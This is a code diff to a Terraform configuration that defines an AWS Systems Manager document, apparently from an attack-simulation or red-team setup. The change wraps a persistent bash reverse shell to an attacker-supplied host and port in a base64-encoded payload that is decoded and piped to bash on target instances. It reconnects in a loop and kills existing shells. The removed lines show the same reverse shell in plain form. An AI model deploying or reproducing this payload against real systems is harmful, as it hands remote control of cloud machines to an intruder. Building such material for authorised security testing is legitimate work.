@@ -1,6 +1,23 @@
 locals {
     host_ip = var.host_ip
     host_port = var.host_port
+
+    payload = <<-EOT
+    truncate -s 0 /tmp/attacker_exec_reverseshell_target.log
+    echo "Attacker Host: ${local.host_ip}:${local.host_port}" > /tmp/attacker_exec_reverseshell_target.log",
+    kill -9 $(ps aux | grep '/bin/bash -c bash -i' | head -1 | awk '{ print $2 }')
+    echo "Running: /bin/bash -c 'bash -i >& /dev/tcp/${local.host_ip}/${local.host_port} 0>&1'" >> /tmp/attacker_exec_reverseshell_target.log
+    while true; do
+        while ! /bin/bash -c 'bash -i >& /dev/tcp/${local.host_ip}/${local.host_port} 0>&1'; do
+            echo "reconnecting..." >> /tmp/attacker_exec_reverseshell_target.log;
+            sleep 10;
+        done;
+        echo "disconnected - wait retry..." >> /tmp/attacker_exec_reverseshell_target.log;
+        sleep 60;
+        echo "starting retry..." >> /tmp/attacker_exec_reverseshell_target.log;
+    done
+    EOT
+    base64_payload = base64encode(local.payload)
 }
 
 resource "aws_ssm_document" "exec_reverse_shell_target" {
@@ -24,10 +41,8 @@ resource "aws_ssm_document" "exec_reverse_shell_target" {
                 "inputs": {
                     "timeoutSeconds": "600",
                     "runCommand": [
-                        "echo \"Attacker Host: ${local.host_ip}:${local.host_port}\" > /tmp/attacker_exec_reverseshell_target.log",
-                        "kill -9 $(ps aux | grep '/bin/bash -c bash -i' | head -1 | awk '{ print $2 }')",
-                        "echo \"Running: /bin/bash -c 'bash -i >& /dev/tcp/${local.host_ip}/${local.host_port} 0>&1'\" >> /tmp/attacker_exec_reverseshell_target.log",
-                        "while true; do { while ! /bin/bash -c 'bash -i >& /dev/tcp/${local.host_ip}/${local.host_port} 0>&1'; do { echo \"reconnecting...\" >> /tmp/attacker_exec_reverseshell_target.log; sleep 10; } done; echo \"disconnected - wait retry...\" >> /tmp/attacker_exec_reverseshell_target.log; sleep 60; } done",
+                        "echo \"${local.base64_payload}\" > /tmp/payload",
+                        "echo '${local.base64_payload}' | base64 -d | /bin/bash -"
                     ]
                 }
             }
